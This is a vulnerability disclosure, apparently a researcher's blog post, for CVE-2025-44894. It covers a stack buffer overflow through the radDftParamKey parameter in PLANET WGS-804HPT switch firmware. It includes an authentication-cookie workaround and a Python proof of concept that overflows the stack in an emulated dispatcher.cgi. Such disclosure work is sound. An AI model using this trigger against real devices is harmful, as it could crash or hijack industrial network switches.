---
title: web_radiusSrv_dftParam_post-radDftParamKey
date: 2025-04-20 17:08:47
tags: cve
---



**Affected Product**: FW-WGS-804HPT

**Affected Firmware Versions**:  v1.305b241111

**Vulnerability Type**: Buffer Overflow

**CVE Identifier**: CVE-2025-44894



# FW-WGS-804HPT_v1.305b241111 introduced

The WGS-804HPT-V2 is a ruggedized industrial-grade Ethernet switch designed for harsh environments and mission-critical applications. As part of PLANET Technology's Industrial Automation Series, this 8-port managed switch combines Power over Ethernet (PoE+) capabilities with industrial durability, making it ideal for building automation, smart infrastructure, and IoT deployments.



Official Product Page: https://www.planet.com.tw/en/product/wgs-804hpt-v2







# web_radiusSrv_dftParam_post-radDftParamKey

 I discovered a  stack overflow vulnerability in the Planet router.

By analyzing the dispatcher file in the bin directory, I found that the function web_radiusSrv_dftParam_post contains a stack overflow vulnerability.

The stack overflow can be triggered by radDftParamKey key value, which leads to a strcpy stack overflow.

![image-20250321152223389](../res/202503211522484-174514054570712.png)

In the main function, there is an account authentication detection. We create a cookie_0 in the tmp directory, with the content of "20 0 0", and its function is to create a cookie with sufficient permissions to access this route.

```json
20 0 0
```



![image-20250416171210335](../res/image-20250416171210335-174479473186924.png)





﻿The content of the **poc**.py. file is as follows:

```json
import os


a = 0x1F00
var_name = "radDftParamKey"
b = 'a' * 0x500


poc_content = f"&cmd={a}&{var_name}={b}"
with open('poc', 'w') as f:
    f.write(poc_content)

command = (
    "sudo chroot . ./qemu-mips-static "
    "-E REQUEST_METHOD=POST "
    "-E HTTP_COOKIE='hid=0' "
    "-L ./lib "
    "-g 1234 "
    "./dispatcher.cgi "
    "< poc"  
)


os.system(command)

```



![image-20250416171253023](../res/image-20250416171253023-174479477449025.png)

![image-20250416171328965](../res/image-20250416171328965-174479481117326.png)



Through the above image, we can see that we have overflowed to 0x49c and successfully hijacked the control flow. If necessary, more can be overflowed.

